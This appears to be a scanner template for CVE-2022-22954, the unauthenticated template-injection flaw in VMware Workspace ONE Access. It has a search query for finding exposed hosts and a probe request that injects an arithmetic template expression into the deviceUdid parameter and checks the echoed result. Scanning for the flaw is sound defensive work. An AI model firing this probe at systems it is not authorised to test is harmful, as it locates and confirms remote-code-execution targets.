name: VMware_Workspace_ONE_Access_&_Identity_Manager_Remote_Code_Execution__CVE_2022_22954
transport: http
detail:
  dock: '(title="VMware Identity Manager" || (body="/cfg/help/getHelpLink" && body="<h2>VMware
    Identity Manager Portal"))||(banner="Location: /workspaceone/index.html" || (banner="Location:
    /SAAS/apps/" && banner="Content-Length: 0") || (title="Workspace ONE Access" &&
    (body="content=\"VMware, Inc." || body="<div class=\"admin-header-org\">Workspace
    ONE Access</div>")) || title="VMware Workspace ONEÂ® Assist")'
  product: VMware Workspace ONE Access
  homepage: https://docs.vmware.com/cn/VMware-Workspace-ONE-Access/index.html
  impact: '<p><span style="color: rgb(0, 0, 0); font-size: 16px;">VMware workspace
    one access and Identity Manager have a remote command execution vulnerability
    caused by server template injection, which can be exploited by unauthenticated
    attackers for remote arbitrary code execution.</span><br></p>'
  description: '<p><span style="color: rgb(0, 0, 0); font-size: 16px;">VMware Workspace
    ONE is an intelligence-driven digital workspace platform that lets you deliver
    and manage applications anywhere, anytime, on any device, in a simple and secure
    way.<br></span></p><p><span style="color: rgb(0, 0, 0); font-size: 16px;">VMware
    workspace one access and Identity Manager have a remote command execution vulnerability
    caused by server template injection, which can be exploited by unauthenticated
    attackers for remote arbitrary code execution.</span><br></p>'
set:
  rand1: randomInt(1000, 9999)
  rand2: randInt(1000, 9999)
  mul: str(rand1 * rand2)
rules: 
  r1:
    method: GET
    url: /catalog-portal/ui/oauth/verify?deviceUdid=%24%7B{{rand1}}%2A{{rand2}}%7D&code=122&status=adadad
    expression: "response.status == 400 && response.body.bcontains(bytes('device id: ' + mul))"


expression: ''
